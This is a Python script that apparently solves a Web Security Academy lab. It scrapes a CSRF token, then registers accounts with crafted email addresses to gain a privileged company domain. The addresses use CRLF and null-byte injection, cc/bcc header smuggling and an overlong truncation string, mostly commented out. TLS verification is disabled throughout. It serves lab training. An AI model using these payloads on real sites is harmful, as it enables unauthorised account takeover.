import random
import ssl
import urllib.parse
import http.client
import re

LAB_ID = "???"
EXPLOIT_SERVER_ID = "???"


def GET_register() -> http.client.HTTPResponse:
    method, path = 'GET', '/register'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_register(
        session: str,
        csrf: str,
        username: str,
        emails: list[str],
) -> http.client.HTTPResponse:
    method, path = 'POST', '/register'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/register',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'cookie': f'session={session}',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'username': username,
        'csrf': csrf,
        'password': 'Test1234',
    }
    body = urllib.parse.urlencode(fields) + '&' + '&'.join(
        [urllib.parse.urlencode({'email': email}) for email in emails])
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body, headers)
    return connection.getresponse()


def register_session_and_csrf() -> tuple[str, str]:
    response = GET_register()
    cookie_header = response.getheader('set-cookie')
    session = re.findall(r'session=([a-zA-Z0-9]+);', cookie_header)[0]
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return session, csrf


emails_series = [
    # [
    #     "{username}@dontwannacry.com.exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@dontwannacry.com%0d%0aexploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net%0d%0adontwannacry.com",
    # ],
    # [
    #     "{username}@dontwannacry.com%00exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net%00dontwannacry.com",
    # ],
    # [
    #     "dontwannacry.com@exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net#dontwannacry.com",
    # ],
    # [
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net?dontwannacry.com",
    # ],
    # [
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net?x=dontwannacry.com",
    # ],
    # [
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net?x=3&dontwannacry.com",
    # ],
    # [
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net?x=%40dontwannacry.com",
    # ],
    # [
    #     "{username}@dontwannacry.com?x=%40exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net",
    #     "{username}@dontwannacry.com",
    # ],
    # [
    #     "{username}@dontwannacry.com",
    #     "{username}@exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@dontwannacry.com%0A%0Dcc:{username}@exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@dontwannacry.com%0A%0Dbcc:{username}@exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@dontwannacry.com%20{username}@exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@dontwannacry.com,{username}@exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@dontwannacry.com|{username}@exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@dontwannacry.com {username}@exploit-{exploit_server_id}.exploit-server.net",
    # ],
    # [
    #     "{username}@dontwannacry.com%40exploit-{exploit_server_id}.exploit-server.net",
    # ],
    [
        "dkfjrutywb348w7sjdhfyrebdfnvyadhrwesdfnhviudsridfridjflskdurndifaiuhe87yahfoiayeoifnqwjfghaisdhfkjhabsiodfhoiahsoufqwo8hfouas7hdofiyuasodifghaoiusyhdfuaygehyhaioudf7asoidfghoi7hbyasjhdbfouay7gy3i7hfjaysdbfouyag7hfouiyawgefo8ahgiojaoiedufh3dontwannacry.com@exploit-{exploit_server_id}.exploit-server.net",
    ],
]

for emails in emails_series:
    username = f"admin{random.randint(1000, 999999)}"
    session, csrf = register_session_and_csrf()
    formatted_emails = [email.format(username=username, exploit_server_id=EXPLOIT_SERVER_ID) for email in emails]
    response = POST_register(session, csrf, username, formatted_emails)
    print(f"received response {response.status} for {username} : {formatted_emails}")
    if response.status != 200:
        print(response.read().decode('utf-8'))
